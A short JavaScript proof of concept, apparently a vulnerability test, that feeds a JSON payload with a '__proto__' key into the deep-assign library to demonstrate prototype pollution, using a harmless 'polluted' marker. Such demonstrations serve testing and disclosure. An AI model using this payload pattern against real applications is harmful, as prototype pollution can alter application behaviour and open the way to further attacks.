import assign from "deep-assign";
const payloads = ['{"__proto__": {"polluted": "yes"}}'];

var obj = {};

assign({}, JSON.parse(payloads[0]));
